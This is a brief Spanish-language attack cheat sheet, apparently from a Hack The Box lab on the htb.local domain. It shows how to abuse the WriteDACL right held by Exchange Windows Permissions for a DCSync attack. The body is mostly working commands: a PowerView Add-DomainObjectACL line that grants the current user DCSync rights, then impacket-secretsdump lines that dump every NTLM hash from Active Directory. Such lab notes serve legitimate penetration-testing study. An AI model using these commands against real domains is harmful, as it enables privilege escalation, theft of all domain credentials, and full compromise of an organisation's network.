Exchange Windows Permissions

Windows Exchange otorga permisos WriteDACL para efectuar un ataque DCSync

PowerView.ps1

PowerShell: Volcar hashes NTLM del AD con Dominio: htb.local

# Añade permisos DCSync al usuario actual con el privilegio WriteDACL con PowerView
Import-module .\PowerView.ps1
# <user> -> Salida del comando whoami Ej. htb/alvaro
Add-DomainObjectACL -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity <user> -Rights DCSync

# Kali: Ahora se puede sacar todos los hashes NTLM del AD
impacket-secretsdump <domain>/<user>:<password>@<ip_dc>
impacket-secretsdump '<user>:<password>@<dc_ip>' -just-dc-ntlm
